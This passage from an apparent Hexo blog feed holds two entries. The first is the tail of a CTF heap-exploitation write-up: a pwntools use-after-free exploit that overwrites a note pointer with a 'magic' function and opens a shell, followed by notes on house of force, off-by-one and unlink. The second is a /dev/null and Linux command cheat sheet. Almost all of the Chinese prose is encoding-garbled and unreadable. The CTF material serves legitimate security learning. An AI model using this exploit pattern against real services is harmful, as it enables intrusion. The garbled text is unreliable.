punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sizeÈöèÊÑèÔºå‰∏çÁ≠â‰∫é8Â∞±Ë°å</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#contentÁöÑÂ§ßÂ∞è‰∏çÁ≠â‰∫é8ÔºàËøôÊòØÁ®ãÂ∫è‰∏≠note_chunkÁöÑÂ§ßÂ∞è,note_chunkÂ∞±ÊòØÁ¨¨‰∏ÄÊ¨°mallocÁöÑÈÇ£‰∏™ÔºâÔºåÊòØ‰∏∫‰∫ÜÁ≠â‰ºöÂàÜÈÖç8 bytesÁöÑcontent‰∏ç‰ºöË¢´ÂàÜÈÖçÂà∞‰πãÂâçÁöÑcontentÁöÑbin‰∏äÔºåËÄåÊòØÂàÜÈÖçÂà∞noteÁöÑbin‰∏ä„ÄÇ</span><span class="token comment" spellcheck="true">#ÊåâÁÖßmallocÂíåfreeÊú∫Âà∂ÔºåÂ¶ÇÊûúÊàë‰ª¨del_noteÊç¢‰∏Ä‰∏ã‰ΩçÁΩÆÔºåÂÖàdel_note(1)Ôºånote2_chunk‰ºöË¢´ÊîæÂú®ÂéüÊù•ÁöÑnote0_chunk‰ΩçÁΩÆÔºåËÄånote3_contentÈáåÁöÑmagicÂáΩÊï∞Âú∞ÂùÄÂ∞±‰ºöË¢´ÊîæÂú®note1_chunk‰ΩçÁΩÆÔºåÂêéÈù¢ÁöÑprint_note(0)ÔºåÂêåÊ†∑‰πüÈúÄË¶ÅÊîπ‰∏∫print_note(1)ÔºåÊâçËÉΩgetshell</span>del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>bin<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'magic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102214243.png" class="lazyload"></p><h2 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h2><h3 id="hof-house-of-force"><a href="#hof-house-of-force" class="headerlink" title="hof (house of force)"></a>hof (house of force)</h3><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="noopener">heap-exploitation‚Äî‚Äîhouse of forceÂèÇËÄÉÈìæÊé•</a></p><blockquote><p>ÂºïÁî®m4xÂ§ß‰Ω¨ÂçöÂÆ¢ÂéüËØùÔºö</p><p>ÁÆÄÂçïËØ¥‰∏Ä‰∏ãÊàëÂØπ hof ÁöÑÁêÜËß£ÔºåÂ¶ÇÊûúÊàë‰ª¨ËÉΩÊéßÂà∂ <strong>top_chunk</strong> ÁöÑ <strong>size</strong>ÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáÊéßÂà∂ malloc ‰∏Ä‰∫õÁ≤æÂøÉËÆæËÆ°ÁöÑ<strong>Â§ßÊï∞/Ë¥üÊï∞</strong>Êù•ÂÆûÁé∞ÊéßÂà∂ top_chunk ÁöÑÊåáÈíàÔºåÂ∞±ÂèØ‰ª•ÂÆûÁé∞‰ªªÊÑèÂú∞ÂùÄÂÜôÁöÑÊïàÊûúÔºå‰∏™‰∫∫ÊÑüËßâÔºåhof ÁöÑÊ†∏ÂøÉÊÄùÊÉ≥Â∞±Âú®Ëøô‰∏™ force ‰∏äÔºåÁñØÁãÇ mallocÔºåÁÆÄÂçïÁ≤óÊö¥ÊïàÊûúÊòéÊòæ„ÄÇ</p></blockquote><h3 id="off-by-oneÊºèÊ¥û"><a href="#off-by-oneÊºèÊ¥û" class="headerlink" title="off_by_oneÊºèÊ¥û"></a>off_by_oneÊºèÊ¥û</h3><blockquote><p><a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">ÂèÇËÄÉÈìæÊé•</a></p><p>‰∏Ä‰∏™Â≠óËäÇÊ∫¢Âá∫Ë¢´Áß∞‰∏∫off-by-oneÔºåÊõæÁªèÁöÑ‰∏ÄÊÆµÊó∂Èó¥ÈáåÔºåoff-by-oneË¢´ËÆ§‰∏∫ÊòØ‰∏çÂèØ‰ª•Âà©Áî®ÁöÑÔºå‰ΩÜÊòØÂêéÊù•Á†îÁ©∂ÂèëÁé∞Âú®Â†Ü‰∏äÂì™ÊÄïÂè™Êúâ‰∏Ä‰∏™Â≠óËäÇÁöÑÊ∫¢Âá∫‰πü‰ºöÂØºËá¥‰ªªÊÑè‰ª£Á†ÅÁöÑÊâßË°å„ÄÇ</p></blockquote><blockquote><p>==&gt; off-by-oneÊÄªÂÖ±ÂèØ‰ª•ÂàÜ‰∏∫‰∏§ÁßçÂà©Áî®ÊñπÂºè:</p><p><strong>chunk overlapping</strong></p><ul><li><p>off-by-one overwrite allocated</p></li><li><p>off-by-one overwrite freed</p></li><li><p>off-by-one null byte</p></li></ul><p><strong>unlink</strong></p><ul><li><p>off-by-one small bin</p></li><li><p>off-by-one large bin</p></li></ul></blockquote><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">unlink‚Äî‚Äîpdf</a></p><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ-1"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ-1" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p>checksec it!</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102221726.png" class="lazyload"></p><p>ÂºÄÂêØ‰∫ÜNX,StackÔºåÂêåÊ†∑Êó†Ê≥ïÈÄöËøáÂ∏∏ËßÑÊñπÂºèÊù•ÊîªÂáª„ÄÇ</p></blockquote><p>ÂæÖÊõ¥Êñ∞„ÄÇ„ÄÇ„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>/dev/nullÂíåÂ∏∏Áî®linuxÂëΩ‰ª§ÈõÜ</title>
      <link href="/2018/11/01/devnull%E5%92%8C%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
      <url>/2018/11/01/devnull%E5%92%8C%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>/dev/nullÂíåÂ∏∏Áî®linuxÂëΩ‰ª§ÈõÜ„ÄÇ</p><a id="more"></a><h1 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h1><blockquote><p>üò≠Âõ†‰∏∫Âøò‰∫ÜÂèÇËÄÉ‰∫ÜÂì™‰∫õÊñáÁ´†ÔºåÊâÄ‰ª•Â¶ÇËã•Êúâ‰æµÊùÉ‰πãÂ§ÑÔºåËøòËØ∑ËÅîÁ≥ªÂçö‰∏ª„ÄÇ</p></blockquote><h2 id="dev-null-‰∏é-ÈáçÂÆöÂêë"><a href="#dev-null-‰∏é-ÈáçÂÆöÂêë" class="headerlink" title="/dev/null ‰∏é ÈáçÂÆöÂêë"></a>/dev/null ‰∏é ÈáçÂÆöÂêë</h2><p>==&gt; /dev/null ÊòØlinuxÁ≥ªÁªü‰∏≠ÁöÑ‰∏Ä‰∏™ÁâπÊÆäÊñá‰ª∂ËÆæÂ§áÔºå‰ªñÁöÑ‰ΩúÁî®ÊòØÊé•Âèó‰∏ÄÂàáËæìÂÖ•ÂÆÉÁöÑÊï∞ÊçÆÂπ∂‰∏¢ÂºÉËøô‰∫õÊï∞ÊçÆ,ÈÄöÂ∏∏Ë¢´ÂΩìÂÅöÂûÉÂúæÊ°∂Êù•Áî®„ÄÇÂ∞ÜËæìÂá∫ÊµÅÈáçÂÆöÂêëÂà∞/dev/null‰∏äÈù¢ÔºåÂ∞±ÊòØ‰∏¢ÂºÉËøô‰∏™ËæìÂá∫ÊµÅ‰∏äÁöÑÊâÄÊúâËæìÂá∫Ôºå/dev/null‰πüÂè´linux‰∏≠ÁöÑÈªëÊ¥û„ÄÇ</p><p><strong>0:Ë°®Á§∫ÈîÆÁõòËæìÂÖ•(stdin)</strong></p><p><strong>1:Ë°®Á§∫Ê†áÂáÜËæìÂá∫(stdout),</strong>Á≥ªÁªüÈªòËÆ§ÊòØ1 </p><p><strong>2:Ë°®Á§∫ÈîôËØØËæìÂá∫(stderr)</strong> </p><pre class=" language-bash"><code class="language-bash"><span class="token string">"command >/dev/null 2>&amp;1 &amp;"</span>  ‰∏é <span class="token string">"command 1>/dev/null 2>&amp;1 &amp;"</span>  ÁöÑÊÑèÊÄù‰∏ÄÊ†∑1<span class="token punctuation">)</span> command:   Ë°®Á§∫shellÂëΩ‰ª§ÊàñËÄÖ‰∏∫‰∏Ä‰∏™ÂèØÊâßË°åÁ®ãÂ∫è2<span class="token punctuation">)</span> <span class="token operator">></span>:  Ë°®Á§∫ÈáçÂÆöÂêëÂà∞Âì™Èáå 3<span class="token punctuation">)</span> /dev/null:  Ë°®Á§∫LinuxÁöÑÁ©∫ËÆæÂ§áÊñá‰ª∂ 4<span class="token punctuation">)</span> 2:  Ë°®Á§∫Ê†áÂáÜÈîôËØØËæìÂá∫5<span class="token punctuation">)</span> <span class="token operator">&amp;</span>1:  <span class="token operator">&amp;</span>Ë°®Á§∫Á≠âÂêå‰∫éÁöÑÊÑèÊÄù,  2<span class="token operator">></span><span class="token operator">&amp;</span>1Ë°®Á§∫2ÁöÑËæìÂá∫ÈáçÂÆöÂêë‰∫é16<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token keyword">:</span>  **Ë°®Á§∫ÂêéÂè∞ÊâßË°å,Âç≥ËøôÊù°Êåá‰ª§ÊâßË°åÂú®ÂêéÂè∞ËøêË°å** </code></pre><p>==&gt; ÊØîÂ¶Ç find -user root   2&gt;/dev/null  &gt;1.txt &amp;ÔºåÂ∞±ÊòØÂ∞ÜÊñá‰ª∂Áî®Êà∑Â±ûÊÄß‰∏∫rootÁöÑÊñáÊñá‰ª∂ÂêçÂèäÂÖ∂Ë∑ØÂæÑÈáçÂÆöÂêëÂà∞Êñá‰ª∂1.txt‰∏≠</p><p><strong>==&gt; ‰ΩÜÊòØ</strong> find -user root   1&gt;/dev/null Âç¥ÊòØ‰∏é‰∏ä‰∏ÄÊù°ÂëΩ‰ª§‰∏çÂêåÁöÑÔºåÁî®ÁöÑÊòØÊ†áÂáÜËæìÂá∫ÊµÅÔºå‰∏ç‰ºöÊòæÁ§∫Âú®Â±èÂπï‰∏äÔºåÂè™ËÉΩËæìÂá∫Âà∞Êñá‰ª∂‰∏≠ÔºõÂ¶ÇÊûúÂä†ÁÇπ‰∏úË•ø‰∏äÂéªÂèòÊàê find -user root   1&gt;/dev/null 1&gt;&amp;2 ÈÇ£‰πàÊ†áÂáÜËæìÂá∫ÊµÅË¢´ÈáçÂÆöÂêëÂà∞Ê†áÂáÜÈîôËØØËæìÂá∫ÊµÅÔºåÂ∞±‰ºöÂú®Â±èÂπï‰∏äÊòæÁ§∫Êü•ÊâæÂà∞ÁöÑ‰ø°ÊÅØ‰∫Ü„ÄÇ</p><p>==&gt; ÂÜçÊØîÂ¶Ç grep -Ri woshiflag.py 2&gt;/dev/null 1&gt;&amp;2 ,Â∞±ÊòØÂ∞Ü‰∏éwoshiflag.pyËÑöÊú¨ÊúâÂÖ≥ÁöÑÊñá‰ª∂ÂàóÂá∫ÔºåÂπ∂‰∏îÂ∞ÜÊ†áÂáÜËæìÂá∫ÊµÅÈáçÂÆöÂêëÂà∞Ê†áÂáÜÈîôËØØËæìÂá∫ÊµÅ,ÊòæÁ§∫Âà∞Â±èÂπï‰∏ä„ÄÇ</p><hr><pre class=" language-bash"><code class="language-bash">- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span>file- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><p><strong>‰∏çÂêåÁÇπ: I/OÊïàÁéá‰∏äÁöÑÂ∑ÆÂºÇ</strong> </p><p> ==&gt; command 1&gt;file 2&gt;file ËøôÊ†∑ÁöÑÂÜôÊ≥ï,stdoutÂíåstderrÈÉΩÁõ¥Êé•ÈÄÅÂà∞file‰∏≠, file‰ºöË¢´ÊâìÂºÄ‰∏§Ê¨°,ËøôÊ†∑stdoutÂíåstderr‰ºö‰∫íÁõ∏Ë¶ÜÁõñ,ËøôÊ†∑ÂÜôÁõ∏ÂΩì‰ΩøÁî®‰∫ÜFD1ÂíåFD2‰∏§‰∏™ÂêåÊó∂ÂéªÊä¢Âç†fileÁöÑÁÆ°ÈÅì„ÄÇ </p><p>==&gt; command 1&gt;file 2&gt;&amp;1 ËøôÊù°ÂëΩ‰ª§Â∞±Â∞ÜstdoutÁõ¥Êé•ÈÄÅÂêëfile, stderr ÁªßÊâø‰∫ÜFD1ÁÆ°ÈÅìÂêé,ÂÜçË¢´ÈÄÅÂæÄfile,Ê≠§Êó∂,fileÂè™Ë¢´ÊâìÂºÄ‰∫Ü‰∏ÄÊ¨°,‰πüÂè™‰ΩøÁî®‰∫Ü‰∏Ä‰∏™ÁÆ°ÈÅìFD1,ÂÆÉÂåÖÊã¨‰∫ÜstdoutÂíåstderrÁöÑÂÜÖÂÆπ„ÄÇ</p><p>==&gt; ‰ªéI/O ÊïàÁéá‰∏ä,Ââç‰∏ÄÊù°ÂëΩ‰ª§ÁöÑÊïàÁéáË¶ÅÊØîÂêéÈù¢‰∏ÄÊù°ÁöÑÂëΩ‰ª§ÊïàÁéáË¶Å‰Ωé,ÊâÄ‰ª•Âú®ÁºñÂÜôshellËÑöÊú¨ÁöÑÊó∂ÂÄô,ÊúÄÂ§öÁöÑÊó∂ÂÄôÊàë‰ª¨‰ºöcommand 1&gt;file 2&gt;&amp;1 ËøôÊ†∑ÁöÑÂÜôÊ≥ïÔºå Êàñ ‚Äúcommand &gt;file 2&amp;1‚Äù </p><h1 id="linux-Â∏∏Áî®ÂëΩ‰ª§ÈõÜ"><a href="#linux-Â∏∏Áî®ÂëΩ‰ª§ÈõÜ" class="headerlink" title="linux Â∏∏Áî®ÂëΩ‰ª§ÈõÜ"></a>linux Â∏∏Áî®ÂëΩ‰ª§ÈõÜ</h1><h2 id="Á≥ªÁªü‰ø°ÊÅØ"><a href="#Á≥ªÁªü‰ø°ÊÅØ" class="headerlink" title="Á≥ªÁªü‰ø°ÊÅØ"></a>Á≥ªÁªü‰ø°ÊÅØ</h2><pre class=" language-bash"><code class="language-bash">arch ÊòæÁ§∫Êú∫Âô®ÁöÑÂ§ÑÁêÜÂô®Êû∂ÊûÑ<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">uname</span> -m ÊòæÁ§∫Êú∫Âô®ÁöÑÂ§ÑÁêÜÂô®Êû∂ÊûÑ<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">uname</span> -r ÊòæÁ§∫Ê≠£Âú®‰ΩøÁî®ÁöÑÂÜÖÊ†∏ÁâàÊú¨ dmidecode -q ÊòæÁ§∫Á°¨‰ª∂Á≥ªÁªüÈÉ®‰ª∂ - <span class="token punctuation">(</span>SMBIOS / DMI<span class="token punctuation">)</span> hdparm -i /dev/hda ÁΩóÂàó‰∏Ä‰∏™Á£ÅÁõòÁöÑÊû∂ÊûÑÁâπÊÄß hdparm -tT /dev/sda Âú®Á£ÅÁõò‰∏äÊâßË°åÊµãËØïÊÄßËØªÂèñÊìç‰Ωú <span class="token function">cat</span> /proc/cpuinfo ÊòæÁ§∫CPU infoÁöÑ‰ø°ÊÅØ <span class="token function">cat</span> /proc/interrupts ÊòæÁ§∫‰∏≠Êñ≠ <span class="token function">cat</span> /proc/meminfo Ê†°È™åÂÜÖÂ≠ò‰ΩøÁî® <span class="token function">cat</span> /proc/swaps ÊòæÁ§∫Âì™‰∫õswapË¢´‰ΩøÁî® <span class="token function">cat</span> /proc/version ÊòæÁ§∫ÂÜÖÊ†∏ÁöÑÁâàÊú¨ <span class="token function">cat</span> /proc/net/dev ÊòæÁ§∫ÁΩëÁªúÈÄÇÈÖçÂô®ÂèäÁªüËÆ° <span class="token function">cat</span> /proc/mounts ÊòæÁ§∫Â∑≤Âä†ËΩΩÁöÑÊñá‰ª∂Á≥ªÁªü lspci -tv ÁΩóÂàó PCI ËÆæÂ§á lsusb -tv ÊòæÁ§∫ USB ËÆæÂ§á <span class="token function">date</span> ÊòæÁ§∫Á≥ªÁªüÊó•Êúü <span class="token function">cal</span> 2007 ÊòæÁ§∫2007Âπ¥ÁöÑÊó•ÂéÜË°® <span class="token function">date</span> 041217002007.00 ËÆæÁΩÆÊó•ÊúüÂíåÊó∂Èó¥ - ÊúàÊó•Êó∂ÂàÜÂπ¥.Áßí clock -w Â∞ÜÊó∂Èó¥‰øÆÊîπ‰øùÂ≠òÂà∞ BIOSÂÖ≥Êú∫ <span class="token punctuation">(</span>Á≥ªÁªüÁöÑÂÖ≥Êú∫„ÄÅÈáçÂêØ‰ª•ÂèäÁôªÂá∫ <span class="token punctuation">)</span> <span class="token function">shutdown</span> -h now ÂÖ≥Èó≠Á≥ªÁªü<span class="token punctuation">(</span>1<span class="token punctuation">)</span> init 0 ÂÖ≥Èó≠Á≥ªÁªü<span class="token punctuation">(</span>2<span class="token punctuation">)</span> telinit 0 ÂÖ≥Èó≠Á≥ªÁªü<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token function">shutdown</span> -h hours:minutes <span class="token operator">&amp;</span> ÊåâÈ¢ÑÂÆöÊó∂Èó¥ÂÖ≥Èó≠Á≥ªÁªü <span class="token function">shutdown</span> -c ÂèñÊ∂àÊåâÈ¢ÑÂÆöÊó∂Èó¥ÂÖ≥Èó≠Á≥ªÁªü <span class="token function">shutdown</span> -r now ÈáçÂêØ<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">reboot</span> ÈáçÂêØ<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">logout</span> Ê≥®ÈîÄ</code></pre><h2 id="Êñá‰ª∂ÂíåÁõÆÂΩï"><a href="#Êñá‰ª∂ÂíåÁõÆÂΩï" class="headerlink" title="Êñá‰ª∂ÂíåÁõÆÂΩï"></a>Êñá‰ª∂ÂíåÁõÆÂΩï</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /home ËøõÂÖ• <span class="token string">'/ home'</span> ÁõÆÂΩï<span class="token string">' cd .. ËøîÂõû‰∏ä‰∏ÄÁ∫ßÁõÆÂΩï cd ../.. ËøîÂõû‰∏ä‰∏§Á∫ßÁõÆÂΩï cd ËøõÂÖ•‰∏™‰∫∫ÁöÑ‰∏ªÁõÆÂΩï cd ~user1 ËøõÂÖ•‰∏™‰∫∫ÁöÑ‰∏ªÁõÆÂΩï cd - ËøîÂõû‰∏äÊ¨°ÊâÄÂú®ÁöÑÁõÆÂΩï pwd ÊòæÁ§∫Â∑•‰ΩúË∑ØÂæÑ ls Êü•ÁúãÁõÆÂΩï‰∏≠ÁöÑÊñá‰ª∂ ls -F Êü•ÁúãÁõÆÂΩï‰∏≠ÁöÑÊñá‰ª∂ ls -l ÊòæÁ§∫Êñá‰ª∂ÂíåÁõÆÂΩïÁöÑËØ¶ÁªÜËµÑÊñô ls -a ÊòæÁ§∫ÈöêËóèÊñá‰ª∂ ls *[0-9]* ÊòæÁ§∫ÂåÖÂê´Êï∞Â≠óÁöÑÊñá‰ª∂ÂêçÂíåÁõÆÂΩïÂêç tree ÊòæÁ§∫Êñá‰ª∂ÂíåÁõÆÂΩïÁî±Ê†πÁõÆÂΩïÂºÄÂßãÁöÑÊ†ëÂΩ¢ÁªìÊûÑ(1) lstree ÊòæÁ§∫Êñá‰ª∂ÂíåÁõÆÂΩïÁî±Ê†πÁõÆÂΩïÂºÄÂßãÁöÑÊ†ëÂΩ¢ÁªìÊûÑ(2) mkdir dir1 ÂàõÂª∫‰∏Ä‰∏™Âè´ÂÅö '</span>dir1<span class="token string">' ÁöÑÁõÆÂΩï'</span> <span class="token function">mkdir</span> dir1 dir2 ÂêåÊó∂ÂàõÂª∫‰∏§‰∏™ÁõÆÂΩï <span class="token function">mkdir</span> -p /tmp/dir1/dir2 ÂàõÂª∫‰∏Ä‰∏™ÁõÆÂΩïÊ†ë <span class="token function">rm</span> -f file1 Âà†Èô§‰∏Ä‰∏™Âè´ÂÅö <span class="token string">'file1'</span> ÁöÑÊñá‰ª∂<span class="token string">' rmdir dir1 Âà†Èô§‰∏Ä‰∏™Âè´ÂÅö '</span>dir1<span class="token string">' ÁöÑÁõÆÂΩï'</span> <span class="token function">rm</span> -rf dir1 Âà†Èô§‰∏Ä‰∏™Âè´ÂÅö <span class="token string">'dir1'</span> ÁöÑÁõÆÂΩïÂπ∂ÂêåÊó∂Âà†Èô§ÂÖ∂ÂÜÖÂÆπ <span class="token function">rm</span> -rf dir1 dir2 ÂêåÊó∂Âà†Èô§‰∏§‰∏™ÁõÆÂΩïÂèäÂÆÉ‰ª¨ÁöÑÂÜÖÂÆπ <span class="token function">mv</span> dir1 new_dir ÈáçÂëΩÂêç/ÁßªÂä® ‰∏Ä‰∏™ÁõÆÂΩï <span class="token function">cp</span> file1 file2 Â§çÂà∂‰∏Ä‰∏™Êñá‰ª∂ <span class="token function">cp</span> dir/* <span class="token keyword">.</span> Â§çÂà∂‰∏Ä‰∏™ÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂Âà∞ÂΩìÂâçÂ∑•‰ΩúÁõÆÂΩï <span class="token function">cp</span> -a /tmp/dir1 <span class="token keyword">.</span> Â§çÂà∂‰∏Ä‰∏™ÁõÆÂΩïÂà∞ÂΩìÂâçÂ∑•‰ΩúÁõÆÂΩï <span class="token function">cp</span> -a dir1 dir2 Â§çÂà∂‰∏Ä‰∏™ÁõÆÂΩï <span class="token function">ln</span> -s file1 lnk1 ÂàõÂª∫‰∏Ä‰∏™ÊåáÂêëÊñá‰ª∂ÊàñÁõÆÂΩïÁöÑËΩØÈìæÊé• <span class="token function">ln</span> file1 lnk1 ÂàõÂª∫‰∏Ä‰∏™ÊåáÂêëÊñá‰ª∂ÊàñÁõÆÂΩïÁöÑÁâ©ÁêÜÈìæÊé• <span class="token function">touch</span> -t 0712250000 file1 ‰øÆÊîπ‰∏Ä‰∏™Êñá‰ª∂ÊàñÁõÆÂΩïÁöÑÊó∂Èó¥Êà≥ - <span class="token punctuation">(</span>YYMMDDhhmm<span class="token punctuation">)</span> <span class="token function">file</span> file1 outputs the mime <span class="token function">type</span> of the <span class="token function">file</span> as text <span class="token function">iconv</span> -l ÂàóÂá∫Â∑≤Áü•ÁöÑÁºñÁ†Å <span class="token function">iconv</span> -f fromEncoding -t toEncoding inputFile <span class="token operator">></span> outputFile creates a new from the given input <span class="token function">file</span> by assuming it is encoded <span class="token keyword">in</span> fromEncoding and converting it to toEncoding. <span class="token function">find</span> <span class="token keyword">.</span> -maxdepth 1 -name *.jpg -print -exec convert <span class="token string">"{}"</span> -resize 80x60 <span class="token string">"thumbs/{}"</span> \<span class="token punctuation">;</span> batch resize files <span class="token keyword">in</span> the current directory and send them to a thumbnails directory <span class="token punctuation">(</span>requires convert from Imagemagick<span class="token punctuation">)</span></code></pre><h2 id="Êñá‰ª∂ÊêúÁ¥¢"><a href="#Êñá‰ª∂ÊêúÁ¥¢" class="headerlink" title="Êñá‰ª∂ÊêúÁ¥¢"></a>Êñá‰ª∂ÊêúÁ¥¢</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -name file1 ‰ªé <span class="token string">'/'</span> ÂºÄÂßãËøõÂÖ•Ê†πÊñá‰ª∂Á≥ªÁªüÊêúÁ¥¢Êñá‰ª∂ÂíåÁõÆÂΩï <span class="token function">find</span> / -user user1 ÊêúÁ¥¢Â±û‰∫éÁî®Êà∑ <span class="token string">'user1'</span> ÁöÑÊñá‰ª∂ÂíåÁõÆÂΩï <span class="token function">find</span> /home/user1 -name \*.bin Âú®ÁõÆÂΩï <span class="token string">'/ home/user1'</span> ‰∏≠ÊêúÁ¥¢Â∏¶Êúâ<span class="token string">'.bin'</span> ÁªìÂ∞æÁöÑÊñá‰ª∂ <span class="token function">find</span> /usr/bin -type f -atime +100 ÊêúÁ¥¢Âú®ËøáÂéª100Â§©ÂÜÖÊú™Ë¢´‰ΩøÁî®ËøáÁöÑÊâßË°åÊñá‰ª∂ <span class="token function">find</span> /usr/bin -type f -mtime -10 ÊêúÁ¥¢Âú®10Â§©ÂÜÖË¢´ÂàõÂª∫ÊàñËÄÖ‰øÆÊîπËøáÁöÑÊñá‰ª∂ <span class="token function">find</span> / -name \*.rpm -exec <span class="token function">chmod</span> 755 <span class="token string">'{}'</span> \<span class="token punctuation">;</span> ÊêúÁ¥¢‰ª• <span class="token string">'.rpm'</span> ÁªìÂ∞æÁöÑÊñá‰ª∂Âπ∂ÂÆö‰πâÂÖ∂ÊùÉÈôê <span class="token function">find</span> / -xdev -name \*.rpm ÊêúÁ¥¢‰ª• <span class="token string">'.rpm'</span> ÁªìÂ∞æÁöÑÊñá‰ª∂ÔºåÂøΩÁï•ÂÖâÈ©±„ÄÅÊç∑ÁõòÁ≠âÂèØÁßªÂä®ËÆæÂ§á <span class="token function">locate</span> \*.ps ÂØªÊâæ‰ª• <span class="token string">'.ps'</span> ÁªìÂ∞æÁöÑÊñá‰ª∂ - ÂÖàËøêË°å <span class="token string">'updatedb'</span> ÂëΩ‰ª§ <span class="token function">whereis</span> halt ÊòæÁ§∫‰∏Ä‰∏™‰∫åËøõÂà∂Êñá‰ª∂„ÄÅÊ∫êÁ†ÅÊàñmanÁöÑ‰ΩçÁΩÆ <span class="token function">which</span> halt ÊòæÁ§∫‰∏Ä‰∏™‰∫åËøõÂà∂Êñá‰ª∂ÊàñÂèØÊâßË°åÊñá‰ª∂ÁöÑÂÆåÊï¥Ë∑ØÂæÑ</code></pre><h2 id="ÊåÇËΩΩ‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü"><a href="#ÊåÇËΩΩ‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü" class="headerlink" title="ÊåÇËΩΩ‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü"></a>ÊåÇËΩΩ‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">mount</span> /dev/hda2 /mnt/hda2 ÊåÇËΩΩ‰∏Ä‰∏™Âè´ÂÅöhda2ÁöÑÁõò - Á°ÆÂÆöÁõÆÂΩï <span class="token string">'/ mnt/hda2'</span> Â∑≤ÁªèÂ≠òÂú® <span class="token function">umount</span> /dev/hda2 Âç∏ËΩΩ‰∏Ä‰∏™Âè´ÂÅöhda2ÁöÑÁõò - ÂÖà‰ªéÊåÇËΩΩÁÇπ <span class="token string">'/ mnt/hda2'</span> ÈÄÄÂá∫ <span class="token function">fuser</span> -km /mnt/hda2 ÂΩìËÆæÂ§áÁπÅÂøôÊó∂Âº∫Âà∂Âç∏ËΩΩ <span class="token function">umount</span> -n /mnt/hda2 ËøêË°åÂç∏ËΩΩÊìç‰ΩúËÄå‰∏çÂÜôÂÖ• /etc/mtab Êñá‰ª∂- ÂΩìÊñá‰ª∂‰∏∫Âè™ËØªÊàñÂΩìÁ£ÅÁõòÂÜôÊª°Êó∂ÈùûÂ∏∏ÊúâÁî® <span class="token function">mount</span> /dev/fd0 /mnt/floppy ÊåÇËΩΩ‰∏Ä‰∏™ËΩØÁõò <span class="token function">mount</span> /dev/cdrom /mnt/cdrom ÊåÇËΩΩ‰∏Ä‰∏™cdromÊàñdvdrom <span class="token function">mount</span> /dev/hdc /mnt/cdrecorder ÊåÇËΩΩ‰∏Ä‰∏™cdrwÊàñdvdrom <span class="token function">mount</span> /dev/hdb /mnt/cdrecorder ÊåÇËΩΩ‰∏Ä‰∏™cdrwÊàñdvdrom <span class="token function">mount</span> -o loop file.iso /mnt/cdrom ÊåÇËΩΩ‰∏Ä‰∏™Êñá‰ª∂ÊàñISOÈïúÂÉèÊñá‰ª∂ <span class="token function">mount</span> -t vfat /dev/hda5 /mnt/hda5 ÊåÇËΩΩ‰∏Ä‰∏™Windows FAT32Êñá‰ª∂Á≥ªÁªü <span class="token function">mount</span> /dev/sda1 /mnt/usbdisk ÊåÇËΩΩ‰∏Ä‰∏™usb Êç∑ÁõòÊàñÈó™Â≠òËÆæÂ§á <span class="token function">mount</span> -t smbfs -o username<span class="token operator">=</span>user,password<span class="token operator">=</span>pass //WinClient/share /mnt/share 